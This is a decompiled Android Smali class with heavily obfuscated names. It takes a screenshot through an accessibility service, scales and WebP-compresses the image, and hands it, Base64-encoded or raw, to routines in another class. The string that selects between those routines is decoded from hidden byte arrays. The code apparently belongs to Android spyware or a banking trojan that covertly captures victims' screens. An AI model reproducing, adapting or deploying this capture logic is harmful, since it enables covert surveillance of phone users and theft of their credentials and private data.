.class Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

.field final synthetic f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;

    iput-object p2, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    :try_start_0
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c0;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    move-result-object v0

    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/d0;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/graphics/ColorSpace;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/e0;->a(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v1

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v2

    int-to-float v2, v2

    int-to-float v1, v1

    div-float/2addr v2, v1

    const/16 v1, 0x15e

    int-to-float v3, v1

    mul-float/2addr v2, v3

    float-to-int v2, v2

    const/4 v3, 0x1

    invoke-static {v0, v1, v2, v3}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v1

    iget-object v2, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;

    iget-object v2, v2, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->a:Landroid/content/Context;

    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->r:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v2, v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_1

    const/high16 v2, 0x3f800000    # 1.0f

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->o(Landroid/graphics/Bitmap;F)Landroid/graphics/Bitmap;

    move-result-object v1

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    :cond_1
    :goto_0
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;

    iget-object v4, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;

    iget v4, v4, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->b:I

    invoke-virtual {v1, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;

    iget-object v3, v3, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->c:Ljava/lang/String;

    const/4 v4, 0x4

    new-array v4, v4, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v5, v5, [B

    fill-array-data v5, :array_1

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_2

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;

    iget-object v3, v3, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->a:Landroid/content/Context;

    invoke-static {v3, v2}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->j(Landroid/content/Context;[B)V

    goto :goto_1

    :cond_2
    const/4 v3, 0x0

    invoke-static {v2, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->f:Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;

    iget-object v4, v3, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->a:Landroid/content/Context;

    iget-object v3, v3, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b;->c:Ljava/lang/String;

    invoke-static {v4, v2, v3}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->k(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_1
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$b$a;->e:Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c0;->a(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)Landroid/hardware/HardwareBuffer;

    move-result-object v0

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/f0;->a(Landroid/hardware/HardwareBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_3
    return-void

    :array_0
    .array-data 1
        -0x54t
        0x72t
        0x0t
        -0x56t
    .end array-data

    :array_1
    .array-data 1
        -0x21t
        0x1ct
        0x61t
        -0x26t
        -0x3at
        -0x60t
        -0x44t
        0x28t
    .end array-data
.end method
